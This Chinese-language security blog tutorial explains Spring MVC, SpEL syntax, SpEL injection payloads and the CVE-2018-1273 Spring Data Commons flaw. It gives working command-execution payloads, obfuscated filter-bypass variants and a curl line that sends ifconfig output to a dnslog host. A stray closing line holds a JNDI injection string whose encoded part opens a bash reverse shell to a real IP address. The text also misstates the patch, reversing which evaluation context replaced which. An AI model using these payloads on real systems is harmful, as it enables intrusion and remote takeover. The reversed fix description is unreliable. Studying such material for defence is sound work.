### ****1.1. Spring简介****

Spring是目前Java应用最广泛的框架之一，是拥有着IoC和AOP的优秀机制的容器框架。

而Spring MVC，则是Spring提供给Web开发的框架设计。

###  ** **1.2. Spring MVC实现逻辑****

Spring
MVC中，所有的请求都有DispatcherServlet来统一处理、分发。然后借助HandlerMapping定位到处理请求的控制器(Controller)。

Controller处理完成用户请求后，返回ModelAndView对象给DispatcherServlet。

逻辑实现图如下:

![1651216489_626b906938451b60874c7.png!small](https://image.3001.net/images/20220429/1651216489_626b906938451b60874c7.png!small)

这个图想必比较直观了，从宏观角度来说，DispatcherServlet是整个Web的控制器，从微观角度来说，Controller是每次请求的控制器。

下面将从创建一个Spring MVC开始，熟悉Spring MVC的项目结构和代码逻辑。

###  ** **1.3. Spring MVC项目****

使用IDEA NEW一个Spring项目

并勾选 "Spring MVC"、"Web Application"

![1651216539_626b909b67a41aad64cad.png!small](https://image.3001.net/images/20220429/1651216539_626b909b67a41aad64cad.png!small)

项目结构如下：

![1651216545_626b90a171dc399300727.png!small](https://image.3001.net/images/20220429/1651216545_626b90a171dc399300727.png!small)

配置一个服务器，这里使用Tomcat

![1651216551_626b90a7dbead957654a5.png!small](https://image.3001.net/images/20220429/1651216551_626b90a7dbead957654a5.png!small)

至此项目就算是配置完成了，启动Tomcat，访问index.jsp，效果如下。

![1651216559_626b90af20c241accc8e3.png!small](https://image.3001.net/images/20220429/1651216559_626b90af20c241accc8e3.png!small)

###  ** **1.4. Spring MVC应用****

 ** **1.4.1. 1、Spring MVC App示例****

创建一个包，在包中创建一个控制器TestController

![1651216585_626b90c9eb0a267a8be5d.png!small](https://image.3001.net/images/20220429/1651216585_626b90c9eb0a267a8be5d.png!small)

在控制器中输入以下代码:

package t4rrega.spring;

  

import org.springframework.stereotype.Controller;

import org.springframework.web.bind.annotation.RequestMapping;

  

@Controller

@RequestMapping("/test")

public class TestController {

  

@RequestMapping("/index")

public String test(String input) {

return "/WEB-INF/t4rrega/test.jsp";

}

}

该控制器通过RequestMapping对访问路径进行定义。

该注解用来处理请求地址的映射，可以用于类或方法。

用作类定义时，则表明以该地址作为父路径，如上图中的test()方法，如果需要从URL中访问到，路径为: 父路径+方法路径=/test/index

然后在相应的路径创建文件

![1651216594_626b90d20f53287fef2fe.png!small](https://image.3001.net/images/20220429/1651216594_626b90d20f53287fef2fe.png!small)

修改dispatcher-servlet.xml文件，添加图示中的代码，其中component-scan，允许Spring MVC对包进行查找。

![1651216601_626b90d9c6b6864e68f90.png!small](https://image.3001.net/images/20220429/1651216601_626b90d9c6b6864e68f90.png!small)

修改web.xml

修改url-pattern为"/"

Servlet-mapping不清楚的可以看我之前javaWeb的文章:[
_JavaWeb上_](https://mp.weixin.qq.com/s/8IZa3TParsfSGiNBVnQVBA)、[
_JavaWeb下_](https://mp.weixin.qq.com/s/7y8xJ9sOLOgDljbfj6al8g)

![1651216607_626b90df80e61eec5b29a.png!small](https://image.3001.net/images/20220429/1651216607_626b90df80e61eec5b29a.png!small)

访问指定的路径，效果如下

![1651216612_626b90e4d269dbc00ec9a.png!small](https://image.3001.net/images/20220429/1651216612_626b90e4d269dbc00ec9a.png!small)

 ** **1.4.2. 2、Spring MVC Model向View传递值****

Model向View传递值，主要通过model.addAttribute将值添加到上下文中

之后可以通过model.addAttribute设置的第一个参数名进行获取值

这种方式与JavaWeb的域对象类似

修改TestController.java如下

package t4rrega.spring;

import org.springframework.stereotype.Controller;

import org.springframework.ui.Model;

import org.springframework.web.bind.annotation.RequestMapping;

@Controller

@RequestMapping("/test")

public class TestController {

@RequestMapping("/index")

public String test(Model model) {

model.addAttribute("id", "t4rrega");

return "/WEB-INF/t4rrega/test.jsp";

}

}

通过${}获取引用值

![1651216625_626b90f1d5c0bff96afac.png!small](https://image.3001.net/images/20220429/1651216625_626b90f1d5c0bff96afac.png!small)

效果如下

![1651216631_626b90f7ef2ec7f10ec7f.png!small](https://image.3001.net/images/20220429/1651216631_626b90f7ef2ec7f10ec7f.png!small)

 ** **1.4.3. 3、Spring MVC 获取URL参数值****

Spring MVC获取URL参数值非常简单，只需要在方法中写上需要获取的参数即可。

如下的name

![1651216639_626b90ff6ae171fafb5d9.png!small](https://image.3001.net/images/20220429/1651216639_626b90ff6ae171fafb5d9.png!small)

通过${}获取引用。

![1651216644_626b9104bebd35f3a780b.png!small](https://image.3001.net/images/20220429/1651216644_626b9104bebd35f3a780b.png!small)

效果如下

###  ** **1.5. Spel简介****

 ** **1.5.1. 1、Spel API****

![1651216651_626b910b7b57121981053.png!small](https://image.3001.net/images/20220429/1651216651_626b910b7b57121981053.png!small)

SpelExpressionParser类负责解析表达式，返回一个Expression对象

getValue()方法执行表达式，默认容器是spring本身的容器:ApplicationContext

 ** **1.5.2. 2、Spel Grammer****

 ** **#{}****

EL使用${},而Spel则是使用#{}作为定界符。所有在大括号内的内容都被认定为表达式。

示例:

  * 引用对象: #{person}
  * 引用对象属性: #{person.name}
  * 调用对象方法: #{person.toString()}

 ** **T()****

T()运算符会调用作用域的方法和常量。

例如: T(java.lang.Runtime),会返回一个java.lang.Runtime对象

 ** **1.5.3. 3、Spel 定义****

 ** **3.1 XML****

<bean id="Calc" class="org.spring.samples.Calc">

<property name="Calc"
value="#{T(java.lang.Runtime).getRuntime().exec("/system/Applications/Calculator.app/Contents/MacOS/Calculator")/>

</bean>

 ** **3.2 注解****

public class EmailSender {

// 这里比较特殊，如果获取属性名称，还可以使用${}

@Value("${spring.mail.personname}")

private String personname;

@Value("#{systemProperties['person.region'] }")

private String Locale;

//...

}

 ** **1.5.4. 4、Spel 用法****

 ** **4.1 Class Expression****

new

可以通过new在Spel中实例化对象，类需要通过全限定名进行访问。

表达式内容:

new
java.lang.ProcessBuilder("/system/Applications/Calculator.app/Contents/MacOS/Calculator").start()

![1651216664_626b91187aeb87bbd5775.png!small](https://image.3001.net/images/20220429/1651216664_626b91187aeb87bbd5775.png!small)

T()

表达式内容:

T(java.lang.Runtime).getRuntime().exec("/system/Applications/Calculator.app/Contents/MacOS/Calculator")

![1651216672_626b9120093b7091b5302.png!small](https://image.3001.net/images/20220429/1651216672_626b9120093b7091b5302.png!small)

 ** **4.2 Bean Reference****

如果已经配置上下文，则可以通过@从表中查找JavaBean

![1651216677_626b9125d3e2806c91501.png!small](https://image.3001.net/images/20220429/1651216677_626b9125d3e2806c91501.png!small)

 ** **4.3 Variable Reference****

通过EvaluationContext#setVariable()定义变量，可以在表达式中进行引用。

  * 引用变量: #variableName
  * 引用根对象: #root
  * 引用上下文对象: #this

![1651216687_626b912f78604c6ff4ab2.png!small](https://image.3001.net/images/20220429/1651216687_626b912f78604c6ff4ab2.png!small)

如果把context的root object设置为一个对象时，在获取的时候可以省略root对象前缀

并且在执行表达式时，Spel会在内部使用反射从根对象中获取/设置属性值。

![1651216697_626b913934946844fedce.png!small](https://image.3001.net/images/20220429/1651216697_626b913934946844fedce.png!small)

 ** **4.4 User defined function****

用户可以在Spel中注册自定义方法，将该方法注册到StandardEvaluationContext#registerFunction()中

下面的EncodeUtils#Encode2Base64则是我自定义的方法

###  ** **1.6. Spel注入****

java在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了Spel的所有功能，在未过滤输入的情况下就可能造成任意命令执行。

结合上面的知识点，我们可以使用如下一些语句进行Spel注入。

 ** **1.6.1. 1、new对象****

payload:

new
java.lang.ProcessBuilder("/system/Applications/Calculator.app/Contents/MacOS/Calculator").start()

![1651216705_626b9141b73590080107c.png!small](https://image.3001.net/images/20220429/1651216705_626b9141b73590080107c.png!small)

 ** **1.6.2. 2、反射****

Payload:

this.getClass().forName("java.lang.Runtime").getRuntime().exec("/system/Applications/Calculator.app/Contents/MacOS/Calculator")

效果如下

![1651216713_626b9149476433ec8da5c.png!small](https://image.3001.net/images/20220429/1651216713_626b9149476433ec8da5c.png!small)

 ** **1.6.3. 3、T()运算****

payload:

T(java.lang.Runtime).getRuntime().exec("open -a Calculator.app")

一些常用的绕过payload:

1、String类动态生成字符

T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(111).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(112)))

当然concat(T(java.lang.Character).toString(xxx))也可以替换为new java.lang.String(new
byte[]{xxx,xxx})

2、反射异变

#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new
String[]{"/bin/bash","-c","curl test.ww4ply.dnslog.cn/`ifconfig '\n' '-'`"})}

###  ** **1.7. Spel注入漏洞分析****

主要分享两个最经典的Spel注入漏洞:

  * Spring Data Commons
  * Spring Data Rest
  * Spring Security Oauth2

 ** **1.7.1. Spring Data Commons RCE(CVE-2018-1273)****

影响版本: Spring Data Commons <= 2.0.5.RELEASE

顺带一提一个比较好的习惯，当开源漏洞的补丁出来时，可以第一时间看看github上的代码与上个版本的差异，看一下开发者是如何修补漏洞的，因为很多著名的漏洞都是对补丁的二次绕过，例如Fastjson、Struts2、Weblogic。因此研究代码差异，不仅有助于我们更精准的定位、研究漏洞，更有可能成为下一个漏洞的突破口。

在github上，我们将2.0.6和2.0.5版本代码进行比对

由于是Spel注入漏洞，因此直接定位到了漏洞点MapDataBinder#setPropertyValue()

![1651216724_626b91547df1d864afdf5.png!small](https://image.3001.net/images/20220429/1651216724_626b91547df1d864afdf5.png!small)

 ** **环境部署****

可以直接在我的github上下载

[ _https://github.com/t4rrega/spring-data-web-example.git_](https://github.com/t4rrega/spring-data-web-example.git)

调试的方式启动jar包

java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y
-jar spring-data-web-example-2.0.0.RELEASE.jar

![1651216730_626b915ac4e77fb2db914.png!small](https://image.3001.net/images/20220429/1651216730_626b915ac4e77fb2db914.png!small)

配置IDEA远程调试环境

![1651216735_626b915feefff316c072f.png!small](https://image.3001.net/images/20220429/1651216735_626b915feefff316c072f.png!small)

在MapDataBinder#setPropertyValue()处设置断点

![1651216744_626b9168655d29da64bca.png!small](https://image.3001.net/images/20220429/1651216744_626b9168655d29da64bca.png!small)

debug启动项目

![1651216749_626b916d8a5f3640ae931.png!small](https://image.3001.net/images/20220429/1651216749_626b916d8a5f3640ae931.png!small)

发送数据，触发断点(可以参考后文中的burpsuite数据包内容)

![1651216754_626b9172335f3d46fff53.png!small](https://image.3001.net/images/20220429/1651216754_626b9172335f3d46fff53.png!small)

程序断在该方法中，该方法首先通过isWritableProperty()校验propertyName参数是否为Controller设置的Form映射对象中的成员变量，随后调用了parseExpression()来设置需要解析的表达式，最终通过expression.setValue()完成了对表达式的解析。

![1651216760_626b9178aaa3b1c3751fc.png!small](https://image.3001.net/images/20220429/1651216760_626b9178aaa3b1c3751fc.png!small)

那么想要执行任意表达式，首选需要知道isWritableProperty()如何校验的参数。

跟入该方法

![1651216764_626b917cb6c318300c7ed.png!small](https://image.3001.net/images/20220429/1651216764_626b917cb6c318300c7ed.png!small)

isWritableProperty()中调用了getPropertyPath()对propertyName进行了检测，如果该值不为null，则直接return

跟入getPropertyPath()方法

![1651216769_626b9181e0ae64f1ed516.png!small](https://image.3001.net/images/20220429/1651216769_626b9181e0ae64f1ed516.png!small)

在getPropertyPath()方法中，只有两行，分别是:

  * 使用正则将包含方括号在内的特殊字符进行过滤
  * 判断剩下的值，是否为type里的属性

而type是Controller用于接收参数的类

因此整个绕过过程便是将这个类的某个字段加上[xxx]来构造恶意的Spel表达式即可实现Spel注入

还有一点需要注意:

Spring Data Commons 2.0.5版本中，添加了拒绝Spel表达式的关键语句。

所以需要使用反射的方式来构造最终payload

#this.getClass().forName("java.lang.Runtime").getRuntime().exec("open -a
Calculator.app")

![1651216776_626b91883d2b191299fbf.png!small](https://image.3001.net/images/20220429/1651216776_626b91883d2b191299fbf.png!small)

顺带一提，实例化MapDataBinder对象的位置在ProxyingHandlerMethodArgumentResolver

实例化后，并调用了bind方法，将request.getParameterMap()作为参数。也就是说这里就是漏洞原始的触发点

至于为什么ProxyingHandlerMethodArgumentResolver又被调用起来，可以查看一下官方文档，简单来说就是Form接口的问题

![1651216781_626b918d2b28090999876.png!small](https://image.3001.net/images/20220429/1651216781_626b918d2b28090999876.png!small)

流程如上，过程比较简单，我们再来回顾一下补丁。

漏洞形成的原因就是当用户在开发中利用了Spring-data-commons中的特性对用户的输入参数进行自动匹配时候，会将用户提交的form表单中的参数名作为Spel表达式执行。

修复方式也主要是通过替换SimpleEvaluationContext为StandardEvaluationContext完成。

SimpleEvaluationContext的权限则小的多，只支持一些map结构，通用的jang.lang.Runtime,java.lang.ProcessBuilder都已经不再支持，详情可查看SimpleEvaluationContext的实现。

![1651216786_626b9192c40c57cc765a8.png!small](https://image.3001.net/images/20220429/1651216786_626b9192c40c57cc765a8.png!small)

另外两个漏洞下回分解。

payload=${jndi:ldap://49.235.66.165:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC80OS4yMzUuNjYuMTY1Lzg4ODggMD4mMQ%253D%253D}

